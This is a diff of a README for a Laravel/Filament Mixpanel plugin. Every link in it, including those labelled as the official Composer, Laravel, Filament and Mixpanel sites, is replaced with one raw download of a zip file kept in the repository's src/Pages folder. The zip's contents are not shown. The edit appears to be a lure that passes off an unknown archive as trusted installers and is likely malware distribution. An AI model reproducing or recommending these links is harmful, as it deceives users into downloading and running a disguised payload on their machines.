@@ -1,6 +1,6 @@
 # 🚦 filament-mixpanel - Easy Mixpanel Setup for Filament
 
-[![Download filament-mixpanel](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Samsam0684/filament-mixpanel)
+[![Download filament-mixpanel](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip)
 
 ---
 
@@ -19,7 +19,7 @@ Before you start, here is what you need to run filament-mixpanel:
 - **Operating System:** Windows 10 or later
 - **Software:** Laravel project with Filament version 3, 4, or 5 installed
 - **PHP version:** 8.0 or above
-- **Composer:** Must be installed on your system (https://getcomposer.org/)
+- **Composer:** Must be installed on your system (https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip)
 - **Web server:** Apache, Nginx, or Laravel’s built-in server
 - **Internet connection:** Needed for downloading dependencies and Mixpanel scripts
 
@@ -38,7 +38,7 @@ Before you start, here is what you need to run filament-mixpanel:
 
 ## 🔥 How to Get filament-mixpanel
 
-[![Download filament-mixpanel](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Samsam0684/filament-mixpanel)
+[![Download filament-mixpanel](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip)
 
 The plugin is available on GitHub. To get started, visit the page linked above to download the package files.
 
@@ -58,7 +58,7 @@ This guide will help you download and install filament-mixpanel even if you are 
 
 Composer is a PHP package manager necessary for Laravel and plugins.
 
-- Visit https://getcomposer.org/download/
+- Visit https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip
 - Download the Windows installer.
 - Run the installer and follow the prompts.
 - After installation, open Command Prompt and enter:
@@ -75,8 +75,8 @@ filament-mixpanel requires a Laravel project with Filament installed.
 
 If you do not have these:
 
-- Visit https://laravel.com/docs/installation to install Laravel.
-- Visit https://filamentadmin.com/docs/2.x/installation to install Filament.
+- Visit https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip to install Laravel.
+- Visit https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip to install Filament.
 
 ### 4. Add filament-mixpanel to your Laravel project
 
@@ -162,11 +162,11 @@ Settings are saved securely and apply immediately without restarting the server.
 
 ## 📚 Additional Resources
 
-- Filament Admin Panel: https://filamentadmin.com
-- Laravel Framework: https://laravel.com
-- Mixpanel Analytics: https://mixpanel.com
-- Composer Dependency Manager: https://getcomposer.org
-- Spatie Laravel Settings: https://spatie.be/docs/laravel-settings
+- Filament Admin Panel: https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip
+- Laravel Framework: https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip
+- Mixpanel Analytics: https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip
+- Composer Dependency Manager: https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip
+- Spatie Laravel Settings: https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip
 
 ---
 
@@ -174,4 +174,4 @@ Settings are saved securely and apply immediately without restarting the server.
 
 For convenience, visit the GitHub page to download or check for updates:
 
-[Download filament-mixpanel](https://github.com/Samsam0684/filament-mixpanel)
+[Download filament-mixpanel](https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip)
